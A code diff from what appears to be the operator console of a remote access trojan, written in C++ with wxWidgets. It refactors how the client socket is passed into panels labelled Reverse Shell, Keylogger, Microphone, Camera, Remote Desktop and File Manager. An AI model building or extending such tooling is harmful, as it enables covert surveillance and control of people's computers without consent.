@@ -36,7 +36,7 @@ FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
     this->sckCliente = sckID;
     int npos = strID.find('/', 0);
     this->strClienteID = strID.substr(0, npos);
-    this->strIP = strIP;
+    //this->strIP = strIP;
 
     wxString strTitle = "[";
     strTitle.append(strID.c_str());
@@ -46,7 +46,7 @@ FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
     wxPanel* pnl_Left = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
     wxPanel* pnl_Right = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
     
-    this->m_tree = new MyTreeCtrl(pnl_Left, EnumIDS::TreeCtrl_ID,wxDefaultPosition, wxSize(180, 450), this->strClienteID);
+    this->m_tree = new MyTreeCtrl(pnl_Left, EnumIDS::TreeCtrl_ID,wxDefaultPosition, wxSize(180, 450), this->strClienteID, strIP, sckID);
     
     wxTreeItemId rootC = this->m_tree->AddRoot(wxT("CLI"));
     wxTreeItemId rootAdmin = this->m_tree->AppendItem(rootC, wxT("[Admin]"));
@@ -133,14 +133,7 @@ void FrameCliente::OnClose(wxCloseEvent& event) {
 void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
     wxTreeItemId itemID = event.GetItem();
     wxString wStr = GetItemText(itemID);
-    SOCKET temp_socket = INVALID_SOCKET;
-    std::string temp_strID = "";
-
-    FrameCliente* temp_frame = (FrameCliente*)this->GetParent();
-    if (temp_frame) {
-        temp_socket = temp_frame->sckCliente;
-    }
-
+    
     bool isFound = false;
     //Si el panel/frame ya esta abierto solo hacer focus
     for (int i = 0; i < this->p_Notebook->GetPageCount(); i++) {
@@ -155,19 +148,19 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
         this->p_Notebook->Freeze();
 
         if (wStr == "Reverse Shell") {
-            this->p_Notebook->AddPage(new panelReverseShell(this), wStr, true);
+            this->p_Notebook->AddPage(new panelReverseShell(this, this->sckCliente), wStr, true);
         } else if (wStr == "Admin de Archivos") {
-            this->p_Notebook->AddPage(new panelFileManager(this), wStr, true);
+            this->p_Notebook->AddPage(new panelFileManager(this, this->sckCliente, this->strClienteID, this->strClienteIP), wStr, true);
         } else if (wStr == "Admin de Procesos") {
-            this->p_Notebook->AddPage(new panelProcessManager(this), wStr, true);
+            this->p_Notebook->AddPage(new panelProcessManager(this, this->sckCliente), wStr, true);
         } else if (wStr == "Keylogger") {
-            this->p_Notebook->AddPage(new panelKeylogger(this), wStr, true);
+            this->p_Notebook->AddPage(new panelKeylogger(this, this->sckCliente), wStr, true);
         } else if (wStr == "Microfono") {
-            this->p_Notebook->AddPage(new panelMicrophone(this,temp_socket), wStr, true);
+            this->p_Notebook->AddPage(new panelMicrophone(this,this->sckCliente), wStr, true);
         } else if (wStr == "Camara") {
-            this->p_Notebook->AddPage(new panelCamara(this), wStr, true);
+            this->p_Notebook->AddPage(new panelCamara(this, this->sckCliente), wStr, true);
         }else if (wStr == "Escritorio Remoto") {
-            frameRemoteDesktop* frm_temp = DBG_NEW frameRemoteDesktop(this);
+            frameRemoteDesktop* frm_temp = DBG_NEW frameRemoteDesktop(this, this->sckCliente);
             frm_temp->Show(true);
         }else if (wStr == "Transferencias") {
             this->p_Notebook->AddPage(new panelTransferencias(this, this->strClienteID), wStr, true);
